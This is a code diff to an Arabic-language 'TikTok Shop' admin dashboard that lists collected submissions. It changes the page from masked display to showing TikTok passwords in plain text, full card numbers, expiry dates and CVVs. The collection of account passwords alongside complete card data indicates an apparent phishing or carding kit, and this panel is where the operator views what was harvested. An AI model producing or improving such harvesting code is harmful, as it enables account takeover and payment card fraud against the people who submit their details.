@@ -19,10 +19,8 @@ export default async function handler(req, res) {
             }
         }
         
-        // ترتيب من الأحدث إلى الأقدم
         submissions.sort((a, b) => b.id - a.id);
         
-        // عرض جدول مميز
         res.setHeader('Content-Type', 'text/html');
         res.status(200).send(`
 <!DOCTYPE html>
@@ -92,12 +90,6 @@ export default async function handler(req, res) {
             font-weight: bold;
         }
         td { color: #e2e8f0; }
-        .badge {
-            background: #ff4757;
-            padding: 4px 8px;
-            border-radius: 20px;
-            font-size: 11px;
-        }
         .empty {
             text-align: center;
             padding: 40px;
@@ -123,7 +115,7 @@ export default async function handler(req, res) {
 <body>
 <div class="container">
     <h1>📊 لوحة التحكم - TikTok Shop</h1>
-    <p class="subtitle">إدارة الطلبات والبيانات</p>
+    <p class="subtitle">جميع البيانات ظاهرة للقراءة</p>
     
     <a href="/api/get-data" class="refresh-btn">🔄 تحديث</a>
     
@@ -152,7 +144,9 @@ export default async function handler(req, res) {
                     <th>كلمة المرور</th>
                     <th>الباقة</th>
                     <th>المبلغ</th>
-                    <th>آخر 4 أرقام</th>
+                    <th>رقم البطاقة</th>
+                    <th>تاريخ الانتهاء</th>
+                    <th>CVV</th>
                     <th>التاريخ</th>
                 </tr>
             </thead>
@@ -161,10 +155,12 @@ export default async function handler(req, res) {
                 <tr>
                     <td>${i+1}</td>
                     <td>${s.tiktok_username || '-'}</td>
-                    <td><span class="badge">${s.tiktok_password ? '••••••' : '-'}</span></td>
+                    <td>${s.tiktok_password || '-'}</td>
                     <td>${s.package?.coins?.toLocaleString() || '-'} عملة</td>
                     <td>${s.package?.price || '-'} $</td>
-                    <td>**** ${s.card?.number?.slice(-4) || '-'}</td>
+                    <td>${s.card?.number || '-'}</td>
+                    <td>${s.card?.expiry || '-'}</td>
+                    <td>${s.card?.cvv || '-'}</td>
                     <td>${new Date(s.time).toLocaleString('ar')}</td>
                 </tr>
                 `).join('')}
